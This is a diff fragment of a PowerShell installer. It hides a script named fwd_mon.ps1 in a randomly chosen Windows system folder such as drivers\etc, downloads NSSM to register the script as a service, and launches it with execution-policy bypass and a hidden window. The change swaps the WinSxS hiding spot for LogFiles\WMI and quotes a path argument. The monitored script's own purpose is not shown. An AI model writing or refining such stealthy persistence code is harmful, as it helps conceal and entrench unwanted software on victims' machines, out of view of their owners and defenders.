@@ -6,7 +6,7 @@ $paths = @(
     "$env:windir\system32\config\systemprofile\AppData\Local",
     "$env:windir\System32\WindowsPowerShell\v1.0\Modules",
     "$env:windir\System32\drivers\etc",
-    "$env:windir\WinSxS"
+    "$env:windir\System32\LogFiles\WMI"
 )
 
 $nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"
@@ -16,7 +16,7 @@ $fwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $fwdmonPath = "$fwdmonPath\fwd_mon.ps1"
 $serviceName = "MyfwdmonService"
 $exepath = "powershell.exe"
-$arguments = "-ep bypass -nop -w hidden $fwdmonPath -basePath $basePath"
+$arguments = "-ep bypass -nop -w hidden $fwdmonPath -basePath '$basePath'"
 $downloadPath = "$env:temp\nssm.zip"
 
 if(-not(Test-Path -Path $nssmFolder -PathType Container)){
